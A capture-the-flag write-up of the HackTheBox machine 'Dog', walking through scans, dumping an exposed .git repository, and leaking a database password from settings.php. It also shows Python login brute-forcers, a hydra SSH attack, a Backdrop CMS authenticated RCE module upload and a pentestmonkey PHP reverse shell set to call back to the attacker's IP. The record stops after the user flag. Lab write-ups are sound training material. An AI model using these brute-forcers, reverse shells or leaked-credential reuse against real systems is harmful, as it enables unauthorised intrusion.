---
layout: page
title: Dog
description: Exploited RCE and exposed credentials.
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/logo.png" title="HTB Dog Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/Dog">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Alrighty.  We are going to tackle the box, Dog.  It is about to have a ruff day!

Let's get a list of the services by running an nmap scan.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.58 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 00:34 AEST
Nmap scan report for 10.10.11.58
Host is up (0.76s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   616.35 ms 10.10.16.1
2   616.43 ms 10.10.11.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.79 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
For completeness, run nmap against the UDP protocol.

{% capture nmapfull %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ sudo nmap -sU -oN nmapudp 10.10.11.58     
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 00:35 AEST
Nmap scan report for 10.10.11.58
Host is up (0.49s latency).
All 1000 scanned ports on 10.10.11.58 are in ignored states.
Not shown: 1000 closed udp ports (port-unreach)

Nmap done: 1 IP address (1 host up) scanned in 1011.83 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmapfull %}

<br />
Check the landing page for the webserver running on port 80.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/landingpage.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for that landing page.

{% capture landingsource %}
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8" />
<link rel="shortcut icon" href="http://10.10.11.58/core/misc/favicon.ico" type="image/vnd.microsoft.icon" />
<link rel="alternate" type="application/rss+xml" title="Home page feed" href="http://10.10.11.58/?q=rss.xml" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="Generator" content="Backdrop CMS 1 (https://backdropcms.org)" />
    <title>Home | Dog</title>

<snip>

<div class="block-content">
    <span>Powered by <a href="https://backdropcms.org">Backdrop CMS</a></span>  </div>
</div>
      </div><!-- /.container -->
    </footer>
  </div><!-- /.layout--boxton -->
          </body>
</html>
{% endcapture %}
{% include terminal.html language='browser' title='view-source:http://10.10.11.58' content=landingsource %}

<br />
Take a look at the robots file to see what it says.

{% capture robotstxt %}
#
# robots.txt
#
# This file is to prevent the crawling and indexing of certain parts
# of your site by web crawlers and spiders run by sites like Yahoo!
# and Google. By telling these "robots" where not to go on your site,
# you save bandwidth and server resources.
#
# This file will be ignored unless it is at the root of your host:
# Used:    http://example.com/robots.txt
# Ignored: http://example.com/site/robots.txt
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/robotstxt.html
#
# For syntax checking, see:
# http://www.robotstxt.org/checker.html

User-agent: *
Crawl-delay: 10
# Directories
Disallow: /core/
Disallow: /profiles/
# Files
Disallow: /README.md
Disallow: /web.config
# Paths (clean URLs)
Disallow: /admin
Disallow: /comment/reply
Disallow: /filter/tips
Disallow: /node/add
Disallow: /search
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
# Paths (no clean URLs)
Disallow: /?q=admin
Disallow: /?q=comment/reply
Disallow: /?q=filter/tips
Disallow: /?q=node/add
Disallow: /?q=search
Disallow: /?q=user/password
Disallow: /?q=user/register
Disallow: /?q=user/login
Disallow: /?q=user/logout
{% endcapture %}
{% include terminal.html language='browser' title='http://10.10.11.58/robots.txt' content=robotstxt %}

<br />
Run the CMS that we idenified through the searchsploit.  There is an authenticated RCE so it looks like we just need some creds.

{% capture searchsploit %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ searchsploit Backdrop CMS                 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Backdrop CMS 1.20.0 - 'Multiple' Cross-Site Request Forgery (CSRF)                                                                                                                                        | php/webapps/50323.html
Backdrop CMS 1.23.0 - Stored XSS                                                                                                                                                                          | php/webapps/51905.txt
Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)                                                                                                                                        | php/webapps/52021.py
Backdrop Cms v1.25.1 - Stored Cross-Site Scripting (XSS)                                                                                                                                                  | php/webapps/51597.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=searchsploit %}

<br />
Check the page for pontential usernames.  We find dogBackDropSystem which could be a possibility.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/potentialuser.png" title="Potential User" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the login page to see what it looks like.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/checklogin.png" title="Check Login Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try logging in with the dogBackDropSystem from earlier.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/checkdoguser.png" title="Try dogBackDropSystem" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try logging in with the Anonymous from ealier.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/checkanonuser.png" title="Try Anonymous" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
View the login request in the Burp Suite.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/burpsuite.png" title="Login Burp Suite Request" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Build a python brute-forcer for the dogBackDropSystem user to try and crack the password.

{% capture bruteforce %}
import requests

def parse_form_id(site_text):
    if '"form_build_id" value="' in site_text:
        return site_text.split('"form_build_id" value="')[1].split('"')[0]
    else:
        return None

url = 'http://10.10.11.58/?q=user/login'
headers = {'Content-Type':'application/x-www-form-urlencoded'}
data = {'name':'dogBackDropSystem',
        'pass':'a',
        'form_build_id':'form-qwqPyOkU4Z3IJFOfesomhJ7bRQB4_psm2K2P9ZFIrn4',
        'form_id':'user_login',
        'op':'Log+in'}

s = requests.Session()
response = s.get(url=url)
csrf = parse_form_id(response.text)

with open('/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt','r') as fs:
    for line in fs:
        password = line.rstrip('\n')        

        data['pass'] = password
        data['form_build_id'] = csrf

        sec_response = s.post(url=url, headers=headers, data=data)

        if 'incorrect' not in sec_response.text:
            print(f'The password is {password}')
            print(sec_response.text)
        else:
            csrf = parse_form_id(sec_response.text)

print('End')
{% endcapture %}
{% include terminal.html language='python' title='htb-dog_0x00.py' content=bruteforce %}

<br />
Check the about section and we notice another potential email.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/aboutsection.png" title="About Section" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the hosts file with the dog.htb domain from the email.

{% capture etchosts %}
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.58     dog.htb


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
{% endcapture %}
{% include codebox.html title="/etc/hosts" content=etchosts %}

<br />
Attempt to register a new user.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/attemptregister.png" title="Attempt to Register" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the README file.

{% capture readme %}
Backdrop is a full-featured content management system that allows non-technical
users to manage a wide variety of content. It can be used to create all kinds of
websites including blogs, image galleries, social networks, intranets, and more.

Backdrop aims to provide:
- A CMS that can be used out-of-the-box.
- Code that can be learned quickly.
- Extensible APIs.

<snip>
{% endcapture %}
{% include codebox.html title="README" content=readme %}

<br />
Check the core directory and view the directory listing.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/checkcore.png" title="Check Core" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the files directory and view the directory listing.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/checkfiles.png" title="Check Files" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run nikto vulnerability scanner against the webserver.

{% capture nikto %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ nikto -h http://10.10.11.58 -o nikto.txt
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.58
+ Target Hostname:    10.10.11.58
+ Target Port:        80
+ Start Time:         2025-06-02 15:19:36 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: Backdrop CMS 1 was identified via the x-generator header. See: https://www.drupal.org/project/remove_http_headers
+ /: Uncommon header 'x-backdrop-cache' found, with contents: HIT.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: Entry '/?q=filter/tips/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /core/: Directory indexing found.
+ /robots.txt: Entry '/core/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/README.md' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/?q=user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 22 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /files/: Directory indexing found.
+ /files/: This might be interesting.
+ /LICENSE.txt: License file found may identify site software.
+ /sites/: Directory indexing found.
+ /.git/index: Git Index file may contain directory listing information.
+ /.git/HEAD: Git HEAD file found. Full repo details may be present.
+ /.git/config: Git config file found. Infos about repo details may be present.
+ /README.md: Readme Found.
+ 8098 requests: 0 error(s) and 21 item(s) reported on remote host
+ End Time:           2025-06-02 16:11:00 (GMT10) (3084 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nikto %}

<br />
Enumerate the .git and find a potential email.

{% capture githead %}
0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000	commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
{% endcapture %}
{% include terminal.html language='browser' title='http://dog.htb/.git/logs/HEAD' content=githead %}

<br />
Download the .git index to the attack machine.

{% capture downloadgitindex %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ wget http://dog.htb/.git/index                           
--2025-06-02 16:09:19--  http://dog.htb/.git/index
Resolving dog.htb (dog.htb)... 10.10.11.58
Connecting to dog.htb (dog.htb)|10.10.11.58|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 344667 (337K)
Saving to: ‘index’

index                                                      100%[========================================================================================================================================>] 336.59K   100KB/s    in 3.4s    

2025-06-02 16:09:24 (100 KB/s) - ‘index’ saved [344667/344667]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadgitindex %}

<br />
Run strings against the index file we just downloaded.

{% capture stringsindex %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ strings index                             
DIRC
`X&[**e
\@X 

<snip>

Rfiles/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/taxonomy.vocabulary.tags.json
Lfiles/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/telemetry.settings.json
w!+n1
k@Ec
Ifiles/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json
Dfiles/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/user.flood.json
Cfiles/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/user.mail.json
Qfiles/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/user.role.administrator.json
})$g

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=stringsindex %}

<br />
Pull the update.settings.json that we observed in the strings output.  We find another email and potential name, tiffany.

{% capture updatesetting %}
{
    "_config_name": "update.settings",
    "_config_static": true,
    "update_cron": 1,
    "update_disabled_extensions": 0,
    "update_interval_days": 0,
    "update_url": "",
    "update_not_implemented_url": "https://github.com/backdrop-ops/backdropcms.org/issues/22",
    "update_max_attempts": 2,
    "update_timeout": 30,
    "update_emails": [
        "tiffany@dog.htb"
    ],
    "update_threshold": "all",
    "update_requirement_type": 0,
    "update_status": [],
    "update_projects": []
}
{% endcapture %}
{% include terminal.html language='json' title='json' content=updatesetting %}
<a href="http://dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json">http://dog.htb/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json</a>

<br />
Go back to the CMS and confirm the tiffany email.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/confirmtiffany.png" title="Confirm Tiffany Email" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the brute-forcer to include the tiffany email.

{% capture tiffanybrute %}
import requests, time

def parse_form_id(site_text):
    if '"form_build_id" value="' in site_text:
        return site_text.split('"form_build_id" value="')[1].split('"')[0]
    else:
        return None

url = 'http://10.10.11.58/?q=user/login'
headers = {'Content-Type':'application/x-www-form-urlencoded'}
data = {'name':'dogBackDropSystem',
        'pass':'a',
        'form_build_id':'form-qwqPyOkU4Z3IJFOfesomhJ7bRQB4_psm2K2P9ZFIrn4',
        'form_id':'user_login',
        'op':'Log+in'}

s = requests.Session()
response = s.get(url=url)
csrf = parse_form_id(response.text)

print('[*] Starting') 

counter = 0
with open('/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt','r') as fs:
    for line in fs:
        password = line.rstrip('\n')        

        data['pass'] = password
        data['form_build_id'] = csrf

        sec_response = s.post(url=url, headers=headers, data=data)
        counter += 1

        if 'incorrect' not in sec_response.text:
            print(f'The password is {password}')
            print(sec_response.text)
        else:
            if counter % 4 == 0:
                time.sleep(60)
            
            

print('End')
{% endcapture %}
{% include terminal.html language='python' title='htb-dog_0x01.py' content=tiffanybrute %}

<br />
Try the tiffany name against ssh with hydra.

{% capture hydra %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ hydra -l tiffany -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -t 4 10.10.11.58 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 13:41:32
[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task
[DATA] attacking ssh://10.10.11.58:22/
[STATUS] 52.00 tries/min, 52 tries in 00:01h, 9948 to do in 03:12h, 4 active
[STATUS] 50.00 tries/min, 150 tries in 00:03h, 9850 to do in 03:18h, 4 active
[STATUS] 50.14 tries/min, 351 tries in 00:07h, 9649 to do in 03:13h, 4 active
[STATUS] 49.60 tries/min, 744 tries in 00:15h, 9256 to do in 03:07h, 4 active
[STATUS] 49.87 tries/min, 1546 tries in 00:31h, 8454 to do in 02:50h, 4 active
[STATUS] 49.51 tries/min, 2327 tries in 00:47h, 7673 to do in 02:35h, 4 active
[STATUS] 49.75 tries/min, 3134 tries in 01:03h, 6866 to do in 02:19h, 4 active
[STATUS] 51.08 tries/min, 4035 tries in 01:19h, 5965 to do in 01:57h, 4 active
[STATUS] 52.94 tries/min, 5029 tries in 01:35h, 4971 to do in 01:34h, 4 active
[STATUS] 54.22 tries/min, 6018 tries in 01:51h, 3982 to do in 01:14h, 4 active
[STATUS] 54.52 tries/min, 6924 tries in 02:07h, 3076 to do in 00:57h, 4 active
[STATUS] 54.62 tries/min, 7810 tries in 02:23h, 2190 to do in 00:41h, 4 active
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=hydra %}

<br />
Use git-dumper to analyze the git.

{% capture gitdumper %}
┌──(kali㉿kali)-[~/Documents/htb/dog/git-dumper]
└─$ python3 git_dumper.py http://10.10.11.58/.git/ ./dog-git                                             
/home/kali/Documents/htb/dog/git-dumper/git_dumper.py:409: SyntaxWarning: invalid escape sequence '\g'
  modified_content = re.sub(UNSAFE, '# \g<0>', content, flags=re.IGNORECASE)
[-] Testing http://10.10.11.58/.git/HEAD [200]
[-] Testing http://10.10.11.58/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://10.10.11.58/.git/ [200]
[-] Fetching http://10.10.11.58/.gitignore [404]
[-] http://10.10.11.58/.gitignore responded with status code 404
[-] Fetching http://10.10.11.58/.git/logs/ [200]
[-] Fetching http://10.10.11.58/.git/hooks/ [200]
[-] Fetching http://10.10.11.58/.git/HEAD [200]
[-] Fetching http://10.10.11.58/.git/index [200]
[-] Fetching http://10.10.11.58/.git/COMMIT_EDITMSG [200]
[-] Fetching http://10.10.11.58/.git/branches/ [200]
[-] Fetching http://10.10.11.58/.git/info/ [200]
[-] Fetching http://10.10.11.58/.git/description [200]
[-] Fetching http://10.10.11.58/.git/config [200]
[-] Fetching http://10.10.11.58/.git/refs/ [200]
[-] Fetching http://10.10.11.58/.git/logs/HEAD [200]
[-] Fetching http://10.10.11.58/.git/logs/refs/ [200]

<snip>

[-] Fetching http://10.10.11.58/.git/objects/ff/e2bdb70e3508a43577a1e63d8f3e0eb1954bed [200]
[-] Fetching http://10.10.11.58/.git/objects/ff/d522e1da8660cb25dce831f19efa284753b691 [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 2873 paths from the index
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=gitdumper %}

<br />
Check the settings.php page and notice the database password.

{% capture settingsphp %}
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';

<snip>
{% endcapture %}
{% include terminal.html language='php' title='settings.php' content=settingsphp %}

<br />
Login with the tiffany email and the database password from the settings.php.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/logintiffany.png" title="Login Tiffany" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the exploit-db for the exploit that we discovered during the searchsploit.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/exploitdb.png" title="Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/52021">https://www.exploit-db.com/exploits/52021</a>

<br />
Download the exploit from exploit-db.

{% capture downloadexploit %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ wget https://www.exploit-db.com/raw/52021 -O exploit.py                                              
--2025-06-18 23:37:14--  https://www.exploit-db.com/raw/52021
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2678 (2.6K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   2.62K  --.-KB/s    in 0s      

2025-06-18 23:37:15 (89.6 MB/s) - ‘exploit.py’ saved [2678/2678]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ chmod +x exploit.py
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadexploit %}

<br />
Run the exploit and generate a payload.

{% capture runpayload %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ python3 exploit.py http://10.10.11.58/                             
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58//admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58//modules/shell/shell.php
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runpayload %}

<br />
Navigate to the install module page in the cms website.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/navinstallmodule.png" title="Navigate to Install Module" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
In the exploit, update the .info name to avoid duplicates in the system.

{% capture shellinfo %}
type = module
    name = Shell
    description = Controls the visual building blocks a page is constructed
    with. Blocks are boxes of content rendered into an area, or region, of a
    web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
{% endcapture %}
{% include codebox.html title="shell.info" content=shellinfo %}

<br />
Start a netcat listener.

{% capture start443listener %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ sudo rlwrap nc -nlvp 443                  
[sudo] password for kali: 
listening on [any] 443 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=start443listener %}

<br />
Use revshells to generate a payload for our module.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Change the php extension to module.

{% capture changeextension %}
┌──(kali㉿kali)-[~/Documents/htb/dog/shell]
└─$ mv shell.php shell.module
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=changeextension %}

<br />
Download the php reverse shell from pentest monkey.

{% capture downloadphpshell %}
┌──(kali㉿kali)-[~/Documents/htb/dog/shell]
└─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php --inet4-only
--2025-06-19 00:55:49--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘shell.php’

shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0.001s  

2025-06-19 00:55:49 (8.18 MB/s) - ‘shell.php’ saved [5491/5491]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadphpshell %}

<br />
Update the pentestmonkey file to use the tun0 port and IP.

{% capture shellphp %}
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net

<snip>

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.9';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

<snip>

?>
{% endcapture %}
{% include terminal.html language='php' title='shell.php' content=shellphp %}

<br />
Upload the shell using the import module site and navigate to the shell.php.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/dog/uploadshell.png" title="Upload Shell" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Catch the shell and run id to figure out who we are.

{% capture id %}
www-data@dog:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=id %}

<br />
Ls the home folder and note the users with home folders.

{% capture lshome %}
www-data@dog:/home$ ls
ls
jobert  johncusack
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=lshome %}

<br />
Ssh into the system as johncusack with the database password from before.

{% capture sshjohn %}
┌──(kali㉿kali)-[~/Documents/htb/dog]
└─$ ssh johncusack@10.10.11.58
johncusack@10.10.11.58's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 18 Jun 2025 03:10:17 PM UTC

  System load:           0.0
  Usage of /:            49.7% of 6.32GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             239
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.58
  IPv6 address for eth0: dead:beef::250:56ff:fe95:53ed


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

johncusack@dog:~$
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sshjohn %}

<br />
Get the user flag.

{% capture userflag %}
johncusack@dog:~$ cat user.txt
<redacted>
johncusack@dog:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:53:ed brd ff:ff:ff:ff:ff:ff
